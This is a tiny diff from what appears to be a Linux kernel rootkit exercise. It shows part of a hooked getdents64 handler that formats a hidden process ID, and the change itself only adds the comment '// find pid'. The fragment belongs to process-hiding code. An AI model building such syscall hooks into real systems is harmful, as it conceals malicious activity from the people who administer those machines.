@@ -90,6 +90,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
   struct linux_dirent64 * d;
   int bpos = 0;
   int nread; 
+  // find pid
   snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);
 
   // call the original getdents64
